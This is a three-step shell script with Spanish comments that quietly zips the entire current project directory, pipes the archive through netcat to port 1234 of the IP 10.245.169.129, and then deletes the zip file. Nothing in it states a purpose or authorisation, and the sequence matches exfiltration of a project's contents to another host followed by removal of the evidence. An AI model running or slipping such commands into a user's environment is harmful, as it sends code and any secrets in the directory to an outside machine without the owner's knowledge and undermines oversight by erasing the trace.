# Comprimimos el projecto
zip -q -r project.zip .

# Lo enviamos al puerto 1234 del host
nc -v 10.245.169.129 1234 < project.zip

# Eliminamos el archivo
rm project.zip
